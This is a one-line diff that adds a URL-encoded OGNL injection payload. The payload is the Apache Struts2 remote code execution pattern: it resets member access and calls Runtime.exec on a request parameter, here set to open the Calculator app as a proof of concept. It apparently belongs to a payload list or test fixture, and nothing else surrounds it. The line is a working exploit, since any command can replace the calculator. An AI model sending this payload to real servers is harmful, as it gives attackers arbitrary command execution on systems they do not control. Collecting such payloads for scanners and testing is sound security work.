@@ -1,0 +1,1 @@
+%23_memberAccess=%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%2C%40java.lang.Runtime@getRuntime().exec(%23parameters.param[0]).toString.json?param=open -a Calculator.app
